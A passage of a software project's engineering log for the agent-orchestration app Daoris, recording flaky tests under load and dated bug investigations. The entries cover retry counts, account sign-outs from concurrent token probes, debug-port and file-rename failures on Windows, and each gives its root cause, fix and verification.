session ends, so it always ran out at about 40 s and restarted host b then; the session started 41 s into its run.
`SettingsView.doors.test.tsx`'s "closes on a press of the Settings place…" timed out (20 s) once in SESSDEL1c's web run
with two other worktrees building; it passed alone (5/5) and in both later full runs.
`setupStart.test.tsx`'s "opens a fresh machine on Get started, and counts the setup in the status bar" timed out (20 s)
once in ORIENT2h6's merge gate (no web file changed), with three worktrees building beside it. Two page tests timing out
under the same load in one day: a page test that renders the whole shell is the shape to look at. A third, the same
evening: `WorkFrame.test.tsx`'s "hands the words back into the box, and names the files, when a send does not arrive"
timed out (20 s) once in CARRY2d's web run and passed in the next.
The full set on `99b2a858` (2026-10-08) caught `DriverModulePluginsTests.The_kit_makes_a_plugin_where_the_person_names_and_tries_it_or_an_installed_one`
(modules, Process half) failing in the full run and passing alone, with one worktree building beside it; the plugin-kit
repeat FLAKE1's row names.

*Fixed the same day:* `desktop-publish.test.ts`'s "retries a held rename at each package and launcher step" failed
twice (AGENTREAD1's verify, ACCTQUOTE1d's merge gate) with a real EPERM. It handed `layCli` two tries with no wait, the
first an injected refusal, so the second, a real move of files just unpacked, had no retry left when the scanner held
them: the very condition the code under test survives. The stub's real move now waits as `renameHeld` does; only the
injected refusal is counted.

*And in the CLI's own writer:* `sync.test.ts:221` met EPERM renaming `.claude/INDEX.md.daoris-tmp` over its target in
GATE1b's verify. `writeTextAtomic` and `writeBytesAtomic` in `src/fsx.ts`, through which every CLI write goes, still
renamed bare; a consumer's editor or scanner holding the file would refuse a real `sync` the same way. Both now rename
through `renameHeld`, which `fsx.test.ts` holds.

*Narrowed by MOD8 (2026-09-30): every class that starts a real process or runs a real tick carries the `Process`
category, subagents never run it, and the parent and the release run it serially; the final serial run on an idle
machine was 543/543. Still live: `SessionProcesses.Stop` catching only one exception type (a kill mid-exit threw
through a chat's cleanup; being fixed), `LandingPluginTests.A_plugin_that_never_answers…` (a 3 s patience against a
slow `initialize`), and `DrivenSessionInputTests` (acp-stub, "the pipe is being closed", once in a parallel run). The
history below stands.* *`SessionProcesses.Stop` is fixed (FIX-LOG, 2026-09-30); the merge tool now re-runs any
failure in a Process gate, whatever its class.*

`IntakeTests.An_ask_with_an_intake_harness_is_answered_by_a_session_that_publishes_onto_it`: the intake opened, and
its stub agent published nothing onto the ask (2026-09-25, under a loaded full run). It passed 10 runs in a row after.
Its assertion now carries the session's transcript and the tick's events, so the next failure says why: a `fetch` to
the stand-in that failed, an exit, or something else. A gate that fails one run in twenty is a gate people learn to
re-run, which is how a real failure gets waved through. **A second of the same shape** (2026-09-27, with two more
real-tick classes in the suite): `DrivenSessionInputTests`' `acp-stub` case failed once in a full run, and passed
alone and on the next full run. Its wait for the session to start is 15 seconds, under a suite that spawns node in
several classes at once. The assertion does not say which step was slow, so it needs the same treatment. **Seen again
2026-09-28**, beside a third: in consecutive full runs the `acp-stub` case failed once, then
`HookTests.A_real_hook_process_is_started_in_its_folder_with_its_data_and_id_in_the_environment` failed in its
cleanup, the plugin folder still held by the hook's process, and the next full run passed 862/862. The cleanup deletes
before the process has let go. *Fixed 2026-09-30: the hook tests' cleanup now waits for the process to let go.*
**Seen again 2026-09-29**: one failure in a full run of 898 during HELP1c, not named because only the summary line was
kept; the next three full runs passed 898/898. Keep a full run's whole output, so the next one names itself. **Seen
again 2026-09-30**, the output kept: `DrivenSessionInputTests`' `acp-stub` case, 935/936, the record `failed` where
`stopped` was expected after the person's stop, during LOG1a with the rest of the chain queued behind it; ten runs
alone passed. Unconfirmed reading: the stop lands while the stub's process is already ending, and the record takes the
exit's word over the person's. **And a fourth class the same day**:
`CanonicalLineTests.A_session_tree_grows_from_the_line_set_for_its_repository` failed once (*"the tree grew from main,
not develop"*, 993/994) while five subagents built in parallel; its class passed three runs alone. Load is the common
factor in every sighting. The driven-session assertion now carries the record and the tick's lines, so its next
failure names itself; a stop landing mid-handshake was tested and is not the cause. **A fifth class, twice on
2026-09-30** (LOG2's baseline, then its merge while WSR4 built beside it):
`ProcessJobTests.A_child_that_outlives_its_parent_ends_when_the_session_is_untracked`, 1144/1145, green alone three
times running. **A seventh, the same night, caught by the merge tool as a FLAKE** (its first: the category rule, not
the old list): `PseudoConsoleTests.Closing_it_ends_a_child_the_shell_started_too`, 547/548 in a serial Process run
loaded by a subagent's build and a live session, green alone. **A sixth class the same evening**, merging DRV8 while
three worktrees built: `LandedBranchTests.A_branch_landing_records_the_branch_it_made_under_the_home`, 1415/1416,
green alone three times. **And a rehearsal the same day**: the family rehearsal exited 127 straight after building the
HTTP host, writing no transcript of its own, while three worktrees built beside it. It passed 301/301 run alone.
**Since LEFT1 the merge tool runs a rehearsal that died** (a process-level exit, or nothing printed of its own) once
more and reads FLAKE if it passes; one that reported a failed check has failed. The three merges after it (PREVIEW1,
WSR6, LEFT1) needed no re-run. **Two more at LEFT3's merge (2026-10-01)**, with three subagents building beside it,
each failing in the full serial run and passing alone:
`TurnStopTests.A_conversation_on_the_native_door_is_handed_the_plugins_servers` (driver, 571/572) and
`DriverModulePluginsTests.The_kit_makes_a_plugin_where_the_person_names_and_tries_it_or_an_installed_one` (modules,
113/114). Both spawn real processes; load is again the common factor. **And one at NAME1a's merge**:
`PluginKitTests.A_silent_plugin_is_still_running_and_said_nothing_within_the_patience`, a timing test under three
subagents' builds (the driver's Process half took 37 minutes), green alone. **And `PseudoConsoleTests` again** (its
second sighting) at the designs integration's merge, under three builds, green alone. **And a rehearsal check, a new
kind** (merging PLUG10, UNBLOCK4 and UNBLOCK5, three builds beside it): the family rehearsal's *its driver stops its
own losing session* failed on its printed line (DEV3a), 311/312, green alone.

**Sighted 2026-10-02** (merging WSSETUP3/5, four branches building at once):
`DriverModulePluginsTests.The_kit_makes_a_plugin_where_the_person_names_and_tries_it_or_an_installed_one` failed in
the modules' Process half and passed alone. And `PseudoConsoleTests.Closing_it_ends_a_child_the_shell_started_too`
failed twice, alone too: its read of a heartbeat file the child rewrites every 100 ms asked to share only reading and
met the writer's handle; fixed in that merge (TEST4: read sharing read and write, retried briefly), three runs green.
**And merging TOOL4e and SESSUX1a**: `HostSupervisorTests.A_host_that_ignores_its_input_ending_is_killed_after_the_bound`
failed in the modules' Process half and passed alone, under four branches' load. **And merging TOOL6b, SESSUX1i and
WSSETUP14a** (2026-10-02): `HelpChatTests.Only_Ask_Daoris_loads_its_tools_up_front_and_only_where_the_harness_says_how`
failed in the driver's Process half and passed alone, with three branches building beside it. **And merging ANSWER1b,
PAUSE1a and DRIFT1a** (2026-10-03): `ProcessJobTests.A_child_that_outlives_its_parent_ends_when_the_session_is_untracked`
failed in the driver's Process half and passed alone, with four branches building beside it. **And merging ANSWER1c,
DRIFT1b and TOOL4g** (2026-10-03):
`AccountGoalTickTests.One_look_spreads_K_starts_over_N_accounts_and_a_limit_cuts_off_only_its_own`,
`IntakeTests.An_ask_with_an_intake_harness_is_answered_by_a_session_that_publishes_onto_it` and the modules'
`DriverModulePluginsTests.The_kit_makes_a_plugin_where_the_person_names_and_tries_it_or_an_installed_one` failed in
the full runs and passed alone, with three branches building and two real sessions running on the install. **And the
CLI, on PLUGHOOK1's branch** (2026-10-04): `plugin-sources.test.ts:317` and `plugins.test.ts:409` failed with EPERM
removing a fixture folder a child still held, and passed alone (41/41) and in the next full verify. **And merging
REVIEW3, REVIEW4 and MSG1g** (2026-10-04): the modules'
`DriverModulePluginsTests.The_kit_makes_a_plugin_where_the_person_names_and_tries_it_or_an_installed_one` again,
caught by the merge tool as a FLAKE, with one branch building beside it. **And merging TOOL6g, TESTGIT1 and
PLUGHOOK1a** (2026-10-04): the modules' `HarnessProfileTests.Signing_in_to_another_account_keeps_it_and_the_end_names_who`
failed in the full run and passed alone, with three branches building. It signs in through the path TOOL6g's probe
lock now guards; a second sighting reads that lock first.

## TEST1 (open): a Node process on Windows aborts with 0xC0000409 (since 2026-09-21)

**Symptom.** A Node process dies with `worker process exited unexpectedly (code=3221226505)`, Windows `__fastfail`: no
output, no stack, no WER entry. The backlog's TEST1 row keeps what to do; this entry keeps the sightings (D127 §4.3).

**Sightings** (in place of a root cause until one is found; moved from the backlog on 2026-10-04, as written there).
The second sighting was its trigger.

- 2026-09-21, during SURF2, mid-suite. The identical run passed after.
- 2026-09-25, during CONV4b's gate, at test 4 (*a chain moves on when its quest closes done*), 0 ms in, after three
  passed; the other 17 did not run. CONV4b changed no e2e path or host code.
- 2026-10-01, **outside Playwright for the first time**: the deployment rehearsal's own process exited `3221226505` in
  phase 6 (closing the deployed shell), merging TABS1 after a night of parallel builds. LEFT1's re-run rule ran it
  again, which then refused at its first step with EPERM on the scratch folder the dying run's processes still held;
  the rehearsal's removal now waits them out (`maxRetries`). Alone, straight after, it passed 70/70. So it is not the
  test runner's: the common factor is a Node process on Windows ending while its children are killed, as the
  sibling's reproducer says.

**A family sibling documents the same abort** at about 1.5% of e2e runs, with a standing reproducer (spawn a server,
poll it, kill it: about 1 in 300 rounds, 4-way concurrent). The row used to say *capture the Playwright HTML report*,
but the config runs the list reporter, so no such report exists. The next step is a capture that can exist: an HTML or
JSON reporter in `playwright.config.ts`, then the comparison with the sibling's notes. Do not tune timeouts on two
data points either.

## REH1 (open): the release rehearsal's canon-upgrade phase failed whole (since 2026-09-18)

**Symptom.** The release rehearsal reported 45/52, seen twice, **always exactly 7 failures**: precisely the
canon-upgrade phase's 7 checks, so a whole phase fails on a broken precondition rather than a flaky assertion. The
backlog's REH1 row keeps the rule (no tag while it is open) and its closing condition; this entry keeps the sightings
(D127 §4.3).

**Sightings** (in place of a root cause until one is found; moved from the backlog on 2026-10-04, as written there).
Both times it ran straight after canon files were edited and synced. **Every run now writes a transcript to
`_fixtures/rehearsal-logs/` by construction** (2026-09-18), so the next failure is captured without anyone remembering
to. Eight runs that day — several straight after canon edits and syncs, the suspected trigger — all passed 52/52, and
a ninth ran clean 2026-09-20 after the whole DRV5 arc (no canon edits that session, which is the case that has always
passed). Stays open until a captured failure explains it. **Not this**: on 2026-09-21 the rehearsal failed at
`npm pack` before any check ran — a deterministic broken publish build, fixed and gated (FIX-LOG). REH1 is 45/52 with
the canon-upgrade phase's 7 checks failing; a run that never reaches a check is a different animal. Since then the
rehearsal has grown to 114 checks, so a repeat would not read 45/52; it would read as that phase failing whole.

## A retry left a quest parked a second time parked (2026-10-05)

**Symptom.** On the install (2026-10-04), a quest retried once and parked again stayed parked after
`daoris driver retry <quest>` and after the page's *Try again*; only `driver retry --at 6` started it.

**Root cause.** The planner parks a quest when its failures less its mark (`forgiven`) reach the strike limit. Every door
marked at the limit: the CLI's `retry` without `--at`, `RETRY_QUEST` and Ask Daoris's `retry`. That equals the failures only
on a first park. Retried once at three and failed three more times, the quest had six failures, so a new mark of three
still left three past it, and it parked again on the same look.

**Fix.** RETRY1b, D126's note of this date: the `Exhausted` verdict carries the records' count (`Consideration.Failures`),
which the route and Ask Daoris mark at; the terminal counts the records itself (`strikes.ts`, a twin of `ReadStrikes`),
read through the service client, and refuses with the way to give `--at` when it cannot read them.

**Verification.** A quest parked a second time starts after the retry at both doors: `PlannerTests`,
`DriverModuleRetryTests` (the real planner before and after the press) and the CLI's `driverconfig.test.ts`, each failing
before the fix. The family rehearsal now retries a second time and wants nine failures; not run on this branch.

## Four starts on a signed-out account parked a quest in two minutes (2026-10-05)

**Symptom.** On the install, after an update, every account read *never read*, and the rotation started one quest on an
account nobody had signed in to: four starts in two minutes, each failing *the ACP agent refused the call:
Authentication required*, and the third parked the quest on its strikes.

**Root cause.** Three things, read from the code. ROSTER1 keeps readings in `reads.json`, and a build that starts with
none reads every account unknown, which a start runs on (SES3). The door's refusal was recognised by no table, so it was a
failure like any other and told the roster nothing: TOOL6g had refused to read a refusal the agent gave while none was
recorded, so the next start's walk still found that account ready. And `ReadStrikes` counted every failure that did not say
`limit`, so the account's fault counted against the quest.

**Fix.** ROSTER1b, D125's note of this date: the door's failure is read by a table on the toolchain, and a refused sign-in
keeps the account `out` in `reads.json` with its time, which the walk passes; its record's line is one no strike counts.

**Verification.** `SignInRefusedStartTests` and `StrikeTests` failed with the reading or the strike exemption taken out,
and pass with them; the driver's fast half, 4104/4104. `SignInRefusalTickTests` (`Process`) replays the install's case
through real ticks and was not run on this branch.

## A test's one-minute window read the wall clock (2026-10-04)

**Symptom.** Merging PLUGHOOK1a beside two other branches, `PullRequestStateTests.The_clean_up_removes_a_squash_merged_branch…`
failed in the driver's real-process half and again alone: the plugin was asked 6 times where 5 were expected. It had
passed on its own branch.

**Root cause.** An answer a plugin gave within the last minute is reused (`PullRequestStates.Fresh`). The test plans
the clean-up twice and expects the second plan to reuse the first's five answers, but its asks read the wall clock;
under load the first plan took longer than a minute, so the second asked its first entry again. The same class of
defect as the fixed-minute tests above, the other way round.

**Fix.** The test hands `LandingPlugins` a clock held for the whole test, and the one case that dates a kept answer
dates it from that clock.

**Verification.** The class alone on the merge's tree, serial, with three branches building: 4/4 in 5 m 43 s.

## An install started by the dev loop answered bad requests with source paths (2026-10-04)

**Symptom.** A malformed body posted to the install's host (`/api/asks`, an attachment that was not base64) came back
as ASP.NET's developer exception page in plain text: thirty frames, the build machine's source path among them, and
the request's headers.

**Root cause.** `npm run desktop -- run --install` opens the debug port through the window kit's development switch,
`DOTNET_ENVIRONMENT=Development`, and the host the shell starts inherits the environment. The host then ran in
development, and every relaunch since (an update's swap included) inherited it again. The deployment rehearsal had met
the same inheritance and held its host in production with `ASPNETCORE_ENVIRONMENT`; the dev loop's install run did not.
A host the person starts, or a shared one, runs in production and never served the page.

**Fix.** `installEnvironment` gives an install run the port's two halves and `ASPNETCORE_ENVIRONMENT=Production`.

**Verification.** `desktop-tool.test.ts`: the new case failed (no such export), then passed, 41/41. The running install
keeps the old environment until it is next started.
## Every account signed out about ten seconds after the application started (2026-10-04)

**Symptom.** On the install, all three `claude-code` accounts read signed out (`auth status`: `loggedIn: false`). Each
account's `.credentials.json` still held `claudeAiOauth`, with its access and refresh tokens empty strings, which the
agent writes when it signs an account out. account-1 and account-2 were blanked 2 s apart, 13 s after the application
was started by the dev loop's `run --install`; Gmail 9 s after the staged update's swap started the new build. The intake
for two asks then waited on Gmail's cool-off and named neither signed-out account (TOOL6g). The next day, watching the
install's processes while two starts were refused at every look on signed-out accounts, `Daoris.Desktop.exe` started
`claude auth status` at 08:58:13, 08:58:17 and 08:58:37 local; with both asks paused, none in the next 60 s. In that same
window the parent's own Claude Code sign-in, the machine's default one, expired (*Login expired · Please run /login*) and
three subagents stopped.

**Root cause.** Three things Daoris did, read from the code and held by tests:
1. **A refused start asked the agent about every account, and the person's own sign-in, at every look.** The walk met a
   cached word that an account was signed out and called `ReportAsync(refresh: true)` once per start, and the probe asked
   each account's status and then the tool's own home's, with the configuration-home variable unset, which is the
   person's default sign-in. `SignedOutLooksTests` replays it through real looks: with that call put back, five looks
   held on two signed-out accounts and a cooling one probed the agent six times (once to start, then once a look).
2. **Nothing kept two status questions off one account.** `HarnessRoster.ReportAsync` cached each harness's probe in a
   plain dictionary with nothing between a miss and the probe, so the page's roster, Settings → Agents, a start's walk
   and a wiring panel missing it together at start ran separate probes over the same directories.
3. **No probe kept off an account a session of Daoris's ran on.**

The reading, **reproduced with a stand-in and not confirmed on the install**: asked its status with an access token
expired, the agent refreshes it; two at once spend one single-use refresh token twice; one wins, the other is refused and
signs the account out, the winner's new tokens with it. `ProbeRaceTests` makes that runnable with an agent that refreshes
an expired token when asked and spends a refresh token once: two status questions at once sign its account out (the
control), and two `ReportAsync` calls at once did too before the fix. **Not proven**: that the real agent refreshes on
`auth status`; that the install's blanking came from two probes rather than a probe beside a session; and that the
parent's expired default sign-in was this probe at all (the 08:58 questions are consistent with it, and nothing more).
The protocol door (`claude-code-acp`) asks no status question of its own (no login question declared), so two adapters
onto one account did not widen the window.

**Fix.** No probe per look: a start held on a signed-out account believes the agent's word once per sign-out, and asks
that account alone again only when a sign-in or key through Daoris's doors marks it (`harnesses/.probing/<agent>/
<account>.signed-in`, written by the driver's `LoginAsync` and `HarnessKeys.Add` and the CLI's `login` and `key`), or
after an hour's backstop (`HarnessRoster.SignedOutAskedAgain`). The tool's own sign-in is asked only at the person's
press (the roster's refresh, a sign-in or key on the screen, `daoris agent list`), never by the loop. One status question
per configuration home at a time (`ProbeLock`): a gate per home in the process, and a lock file under
`harnesses/.probing/` taken by creating it new, which the CLI takes too (`probelock.ts`, a twin). A probe in flight is
shared by every caller (`ReportAsync`). An account a session of Daoris's runs on, or a start was just chosen on, is not
asked and keeps its last answer, and a start waits out a question being asked of its account before it counts itself.

**Verification.** `SignedOutLooksTests` (2, `Process`): five looks, one probe, every account asked once, the own sign-in
never; a terminal sign-in's mark asked about at the next look, that account alone. `ProbeRaceTests` (6, `Process`): four
of its first five failed before the fix (blanked tokens, or an account asked twice), all pass after; the sixth counts a
signed-out account's questions across looks, a mark, the backstop and the person's press, and failed with the bound
sabotaged. Each `Process` class was run alone, filtered, on this branch. `ProbeLockTests` (17) and `probelock.test.ts`
(7) hold the lock's and the mark's rows on both sides.

## The deployment rehearsal failed after all 110 checks passed (2026-10-04)

**Symptom.** At the merge of REVIEW3, the deployment rehearsal printed *110/110 checks passed* and its whole result, then
exited 1 with `EPERM` removing its own scratch folder. A minute later nothing ran from the folder, and it removed
cleanly.

**Root cause.** The run ends by staging builds into the install it drove. The last build's processes were still letting
go of their files when the result printed, and the final clean was a single `rmSync`. The clean at the start of the
run already retried, after the same lesson.

**Fix.** The final clean retries like the first (twenty times, half a second apart).

**Verification.** The leftover folder removed with the same call; the next merge's deployment rehearsal.

## A test's git helper waited forever on a full stderr pipe (2026-10-04)

**Symptom.** At the merge of REVIEW3, the driver's real-process half sat for 1 h 33 m on one test,
`TreeDiffTests.A_review_starts_two_git_processes_however_many_files_changed`, with a `git add -A` child of the test host
alive and idle. When that git was stopped, the test failed with `(3, 0, 3)` files for `(3, 60, 63)`. The branch's own
gates never ran it: the class is `Process`, which only the parent's merge runs (MOD8).

**Root cause.** The test's helper read git's stdout to its end, and only then its stderr. Where git's line-ending setting
converts on add, `add -A` over sixty new files writes a warning per file to stderr. That is more than the pipe holds, so
git blocks writing it, stdout never ends, and the helper waits on a process that waits on the helper. The product's git
runners (`WorkingTree`, `Harnesses`, `SetupWorld`, `ToolQuestions`) start both reads before waiting, and are not
affected. About eighteen other test helpers keep the sequential read. Their output is small today, so each is a hang
waiting for a bigger fixture.

**Fix.** Both helpers in `TreeDiffTests` start both reads, wait for the exit, then take both. The other helpers are
TESTGIT1's sweep.

**Verification.** Before the fix the test hung twice, in the merge's full run and in its re-run alone, each time on the
sixty-file `add -A`. After it, `TreeDiffTests` and `TreeDiffSplitTests` passed 8/8 in 21 s (serial, `process.runsettings`).

## Two tests stamped a fixed minute their watch read by the wall clock (2026-10-04)

**Symptom.** `SessionRequestsTests`' three say rows started failing at 09:01 UTC on 2026-10-03 on every branch, and
`WorkPausingTests.A_session_another_process_runs_is_stopped_through_a_request_by_the_pause_with_its_words` at 14:03
the same day; the merge gate's fast driver half failed on main with no change to the code.

**Root cause.** Each test wrote its request at a fixed instant (09:00 and 14:02:11 that day) and built the request
watch with a constructor that measured a request's age by the real clock against a one-minute lifetime. Once the
wall clock passed the fixed instant by a minute, every request read as expired and was dropped, so nothing was
stopped and the say went unanswered. The tests passed on the day they were written, which is why no gate caught them.

**Fix.** The registry constructor of `SessionRequestWatch` takes an optional clock, as its other constructor did,
and each test hands the watch the clock its requests were stamped by.

**Verification.** The three say rows and the pause row pass on 2026-10-04; a search found no other test that both
stamps a fixed instant and builds a clockless watch.

## A staged build could not be renamed into place while Windows scanned it (2026-10-03)

**Symptom.** The deployment rehearsal's first run of UPDATE1's update phase failed at its first step:
`publish:desktop --stage` exited with `EPERM: operation not permitted, rename` from `update/.staging` to
`update/staged`, so nothing was staged and every check after it that needed a staged build failed with it.
The roll-back and the refusal checks, which stage their own, passed.

**Root cause.** `promoteStage` renamed a folder of executables written a moment before. On Windows a folder
cannot be renamed while something holds a file inside it open, and the virus scanner opens every new
executable to scan it; the refusal is `EPERM`, and it gives way within seconds. The unit tests stage tiny
folders of text, which nothing scans, so only the deployed artefact met it, the case study's pattern
(`docs/2026-09-22-first-deployment-case-study.md`). It never reached main: the merge's gate caught it.

**Fix.** `renameHeld` in `tools/fsx.mjs` tries a rename again while it is refused with `EPERM`, `EACCES` or
`EBUSY`, and throws any other failure at once. `promoteStage` tries for half a minute, and then copies the build
into place with its manifest written last: whatever reads `update/staged/` reads the manifest first, so a half
copy is nothing staged. Ten seconds was not enough: the second run staged once and failed the next stage, a whole
application with its own Chromium.

**The second defect it hid.** With a swap finally running, the build before it stayed in `update/previous/`:
the launcher finishes by deleting that folder, which holds the launcher's own running `Daoris.exe` moved there
mid-swap, and Windows will not delete a running program, so the delete failed silently and a whole old build was
left until the next update. `StagedBuild.ClearPrevious` removes it once the journal says the swap ended, and the
application tries at each look until the launcher has gone; never while a swap is under way.

**The third.** After a roll-back the build started again answered nothing on its DevTools port: the rehearsal,
told why, found the port held by two listening sockets whose owners had exited. The application started the
launcher, and the launcher the application, with `UseShellExecute = false`, which in .NET always hands the child
every inheritable handle the parent holds; the engine's DevTools socket is one, so each build after a swap carried
the sockets of the builds before it and could not bind its own port. Any handle the application held could ride
into the launcher the same way, one on a file under `app/` among them. Both starts now go through the shell, which
inherits no handle and still hands the environment (checked with a throwaway program before relying on it).

**Verification.** Rows red first: three in `tools-main.test.ts` (a rename refused twice then let through, one
refused past its tries, one failing for another reason), one in `desktop-publish.test.ts` (a stage copied into
place, its manifest last), and one in `InstallUpdaterTests` (the leftover cleared after a finished swap and kept
during one). The rehearsal's leftover and roll-back checks now wait for what they check, and a read of the window
that comes back empty says why, down to who holds the port. Then the merge's gates again, the deployment
rehearsal's update phase among them.

## A limit reset given as a time of day cooled its account for two minutes (2026-10-02)

**Symptom.** The first real rotation on the install (TOOL4f) moved a refused start to the next account as designed,
but `cooling.json` held the refused account only until two minutes after the refusal. Its weekly limit lifted the
next afternoon, so every start that resolved to it after those two minutes would have been refused again.

**Root cause.** The agent printed `your weekly limit resets 4pm (<zone>)` at 4:12pm in that zone. The same account's
sentence the day before had said `resets Oct 3, 4pm`: the agent drops the date once the reset is under a day away.
`AccountLimits.When` (TOOL4a, D125 §2.1) gave every reset a 15-minute grace, a reset up to 15 minutes in the past being
two clocks disagreeing, so it read today's 4pm as just landed and cooled the account for the margin alone. For a time
of day that is backwards: the refusal itself says the reset has not come.

**Fix.** Only a dated reset keeps the grace. A time of day is the first such moment after the refusal, today's or
tomorrow's, so `resets 4pm` at 4:12pm cools until tomorrow's 4:02pm. The install's own entry was set to that by hand
until a republish carried the fix.

**Verification.** `AccountLimitsTests`: the install's sentence, at the minute it was refused, reads the next day's
reset; `7am` seen at 7:05 reads tomorrow's 7:02; a dated `Oct 2, 4pm` seen at 4:05pm keeps the grace; 11:55pm seen at
00:05 is tonight's. All four failed before the change. The driver's fast half passes (2372).

## `run --install` printed a debug port that never opened (2026-10-02)

**Symptom.** Found looking at the install (LOOK4): `node tools/desktop.mjs run --install <folder>` printed
`debug port 9333` twice, nothing listened there on 127.0.0.1 or [::1], and `shot`, `eval` and `click` said nothing
was listening. The same build had opened its port the day before, started the same way.

**Root cause.** Windows held TCP 9309–9408 as an excluded port range (`netsh interface ipv4 show excludedportrange
protocol=tcp`), and a bind to 9333 is refused there with `EACCES` on both loopbacks, measured with Node. The engine
opens its DevTools port by binding it, and when the bind fails it runs on without one and the window starts as
usual. `freePort` (`tools/cdp.mjs`, since `dcbd9b8`) judged a port free when nothing *answered* on it, and a
reserved port answers nothing, so it handed out 9333. Every port its walk tries (9333–9352) sat inside the same
range, so `restart` could not have escaped it. The machine had not rebooted since 2026-09-17, and its host network
service was running, so the range was most likely reserved while it ran, between the two days. When it was taken
was not observed. A listener that accepts and never answers HTTP read as free the same way. Ruled out: the
development check (Shenora 0.19 reads `DOTNET_ENVIRONMENT`, then `ASPNETCORE_ENVIRONMENT`, or a `.dev` marker; the
tool sets the first), and a hand-over to a running instance (the tool refuses a start while one runs from that path,
and a handed-over start ends, where this one ran).

**Fix.** `freePort` binds each port on both loopbacks before asking it, and passes over one that is held or refused.
An address the machine lacks says nothing about the port. When the whole walk is refused it takes a port the system
hands out, held to the same test. `run` then waits up to 30 seconds for the port to answer. When it does not, `run`
says the window started without its debug port, and names `restart`, the engine's log and the reserved ranges. When
the application ended first, `run` says that instead, at once. Either way it exits 2, and the run file records
`debugPortOpen` so `attach` says the same.

**Verify.** `desktop-tool.test.ts`: the port handed out for 9333 binds on 127.0.0.1 (failed first on this machine,
`EACCES`); a silent listener's port is passed over and an injected refusal walks on to the system's pick (both failed
first on any machine); the wait and its two reports. **Not run on the window**, and the engine's own log line for
the refused bind was not seen.

## Saving a repository's declaration erased what it uses from the registry (2026-10-01)

**Symptom.** Found by DEV4 (MANAGE1): Repositories → Manage → *Write daoris.json* left the file's `domain.uses`
as it was, and the registry row lost its `uses` until the repository's next `connect`. The page's *Add repository*
registered an adopted folder without its `uses` the same way.

**Root cause.** The page registers from the shell's answer about the folder (`RegistryModule.Inspect`), and that
answer carried every part of the declaration but `uses`, so the register body's `domain` had none. The HTTP door
reads an absent `uses` as none (D91: absent is the same as empty), and the store replaces a row's `uses` with the
declaration's (`uses = $uses`). Nothing was wrong on disk: the module's merge had kept `uses` in the file since D91.

**Fix.** The answer states `uses` as the manifest has it, `[]` for none, and both of the page's registering doors pass
it in `domain.uses`. Not DEV4's preserve rule for lanes: that rule works because every door that reads the
repository's file sends lanes always, `[]` for none. `connect` and the driver's sync send `uses` only when there is
one, so a store that preserved an absent `uses` could never clear a dependency a repository dropped.

**Verify.** `RegistryModuleTests`: the write's answer and the pick's carry `uses`, an empty list where the manifest
has none or the folder never adopted. `ProjectsView.test.tsx`: the save and the add post `domain.uses`. Each failed
first, on the missing field alone. **Not run on the window.**

## Right after a start, no repository had a line until something else asked (2026-10-01)

**Symptom.** Found looking at the install (LOOK2a): Settings → Workspace's Line and landing cards said no repository
here had a line, and kept saying it until *Bring up to date*'s look happened to ask for the lines again.

**Root cause.** Read from the code, not reproduced on the window. Two halves. (1) A screen open as the shell starts
asks the driver at once. Until the loop hands its service to the routes, `LINES` (like every route that reads the
service) refuses *still coming up*; the query retried once, a second later, and kept the refusal. The cards render an answer they do not have as an empty list, so the
refusal read as "no repository". (2) Nothing asked again but a tick, whose invalidation of the driver's keys does
reach the lines; and the first tick can wait long, on a remote's sync or on another driver's lock (DRV8a). The status
bar said *ready* throughout, because it read the driver's state, which answers from `driver.json` alone. The service
itself was never short of its registry: it reads its store on each ask and is composed before it answers at all.

**Fix.** D46 as amended. The loop says `DRIVER_READY` the moment it hands its service over (`DriverLoop.ComeUpAsync`),
and the page (`useDriverReady`, mounted with the tick's listener) asks again the driver's own answers and every query
refused `DRIVER_NOT_READY`, leaving a query refused for its own reason as it was. `STATE` carries `ready`, and the
status bar says *starting* until it is true.

**Verify.** `DriverModuleLinesTests`: `LINES` refuses and `STATE` says not ready before the loop comes up, and after
it, against a stand-in service, the page was told once and the lines answer every registered repository.
`bridge/driver.test.tsx`: a refused `LINES` and a refused review are asked again on `DRIVER_READY`, and a review
refused as gone is not. `chrome.test.tsx`: the bar's *starting*. **Not run on the window.**

## `shot --theme light` photographed a dark window and said nothing (2026-10-01)

**Symptom.** Found looking at the install (LOOK1): `npm run desktop -- shot --theme light` captured the dark
window, and exited 0. `--page --theme light` did the same, since `--page` never read `--theme` at all.

**Root cause.** `--theme` emulates `prefers-color-scheme` over the debug port, and the page follows that only
while the viewer's theme choice is System (`theme.ts`, `effectiveDark`: a light or dark choice is a forced
`data-theme` that wins over the media query). On the install the choice was dark. Nothing read what theme the
page was in before capturing, so the emulation's silence looked like success.

**Fix.** `withPageTheme` in `tools/desktop.mjs`, for both captures. It emulates the scheme, then reads the
page's theme as the page reckons it. Where the emulation did not take, it sets the viewer's choice for the
capture through the page's own store (`daoris.theme`) and tells the page with the storage event
`followStoredTheme` already hears from a second window, then puts the choice back after the capture, raw value
and all, whether the capture worked or not. A page still not in the theme is refused, never photographed; a
choice that cannot be set or put back fails the shot and names what it was. The capture now throws rather than
exiting, since an exit inside it would have skipped putting the choice back. The key is a twin (`twins.md`).

**Verify.** `desktop-tool.test.ts` runs the expressions in a page of its own that follows a storage event as
`theme.ts` does: a System viewer is emulated and never written to; a dark viewer is set to light and put back,
including when the capture throws; a refused store and a page that does not follow both refuse; a choice that
cannot be put back fails naming it; and the page's key and listener are read from `theme.ts`. **Not run on the
window**: the subagent that built it may not start one.

## A landed session's review offered to land it again, and its preview was always empty (2026-10-01)

**Symptom.** Found by the parent on the installed window (REVIEW2). A session accepted under a branch rule that
tidies: its review said git could not read the session's range (`SESSION_RANGE_UNREADABLE`) and still offered
Accept (naming the branch that already existed), Send back and Discard the tree. Its file preview answered
`PREVIEW_NO_TREE` for every file. A finished session is usually a landed one, so these were the reviews people open.

**Root cause.** Three facts the review never joined. (1) `SESSION_DIFF` and `SESSION_FILE` read only the tree the
session record names, and a tidy removes the tree but not the record's path. (2) The page gated every act on
`hasTree`, which it derives from that path alone (a tree under the trees home, not the checkout), so a removed tree
still looked present and a refusal left Accept and Discard armed. (3) The one place that knew the work had landed,
`landings.json` (D102), was never asked by the review, and it *forgot* an entry once the clean-up removed its branch,
so after a squash merge and a clean-up nothing on the machine said where the work went.

**Fix.** D113. The review reads the tree while it is here, else the session's landing: the landed branch's changes
in the repository's checkout (refs and objects only, the checkout proven to be a repository of its own first), or,
for a branch gone since, that it is gone and whether its work reads on the line. The answer carries `asLanded` and
the page's acts follow it (no Accept, no Send back; Discard only where a tree is still here; the hand-off where one
applies). The preview reads the landed branch once the tree is gone. The record marks a gone branch (`goneAt`,
